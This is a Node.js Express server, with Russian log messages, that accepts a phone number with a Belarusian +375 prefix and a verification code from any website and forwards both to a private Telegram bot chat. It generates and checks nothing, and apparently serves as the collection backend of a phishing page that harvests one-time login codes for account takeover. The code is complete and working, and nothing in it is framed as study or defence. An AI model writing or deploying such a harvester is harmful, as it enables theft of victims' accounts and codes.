const express = require('express');
const fetch = require('node-fetch');
const app = express();
app.use(express.json());

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  next();
});

app.post('/send-code', async (req, res) => {
  const { phone, code } = req.body;
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  console.log('=== ЗАПРОС ПОЛУЧЕН ===');
  console.log('Phone:', phone);
  console.log('Code:', code);
  console.log('Token (начало):', token ? token.substring(0, 10) : 'НЕТ ТОКЕНА');
  console.log('Chat ID:', chatId);

  if (!token || !chatId) {
    console.log('ОШИБКА: не заданы TELEGRAM_BOT_TOKEN или TELEGRAM_CHAT_ID');
    return res.status(500).json({ error: 'Не заданы переменные' });
  }

  const text = `🔐 Код для +375${phone}: ${code}`;
  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: text
      })
    });

    const data = await response.json();
    console.log('=== ОТВЕТ TELEGRAM ===');
    console.log(JSON.stringify(data));

    if (data.ok) {
      console.log('✅ Сообщение отправлено');
      res.json({ success: true });
    } else {
      console.log('❌ Ошибка Telegram:', data.description);
      res.status(500).json({ error: data.description || 'Ошибка отправки' });
    }
  } catch (err) {
    console.log('❌ Сетевая ошибка:', err.message);
    res.status(500).json({ error: 'Сетевая ошибка: ' + err.message });
  }
});

app.get('/', (req, res) => {
  res.send('Сервер работает. POST /send-code для отправки.');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Сервер работает на порту', PORT));
